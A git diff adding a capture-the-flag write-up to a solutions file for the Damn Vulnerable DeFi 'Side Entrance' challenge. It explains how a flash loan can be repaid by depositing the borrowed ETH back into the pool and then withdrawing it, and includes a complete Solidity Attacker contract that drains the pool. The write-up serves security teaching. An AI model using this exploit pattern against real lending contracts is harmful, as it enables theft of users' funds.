@@ -5,6 +5,7 @@
 - [01 Unstoppable](#01-unstoppable)
 - [02 Naive Receiver](#02-naive-receiver)
 - [03 Truster](#03-truster)
+- [04 Side Entrance](#04-side-entrance)
 - [Template](#template)
 
 <!-- /MarkdownTOC -->
@@ -279,6 +280,64 @@ function attack() public {
 ### References
 
 * https://eips.ethereum.org/EIPS/eip-20
+
+## 04 Side Entrance
+
+### Challenge
+
+> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
+>
+> It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
+>
+> You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
+
+### Solution
+
+The `flashLoan` function checks that the contract's balance remains the same after the loan is issued:
+
+```solidity
+if (address(this).balance < balanceBefore) {
+    revert RepayFailed();
+}
+```
+
+If we take out a loan and deposit those funds back into the pool, the pool's balance remains unchanged, but our internal balance entry reflects the deposited amount:
+
+```solidity
+function deposit() external payable {
+    unchecked {
+        balances[msg.sender] += msg.value;
+    }
+    emit Deposit(msg.sender, msg.value);
+}
+```
+
+After depositing, we simply withdraw our funds:
+
+```solidity
+contract Attacker {
+    SideEntranceLenderPool internal pool;
+    address internal recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        pool.flashLoan(1000 ether);
+        pool.withdraw();
+    }
+
+    function execute() external payable {
+        pool.deposit{value: 1000 ether}();
+    }
+
+    receive() external payable {
+        payable(recovery).transfer(msg.value);
+    }
+}
+```
 
 --------------------------------------------------------------------------------
 ## Template
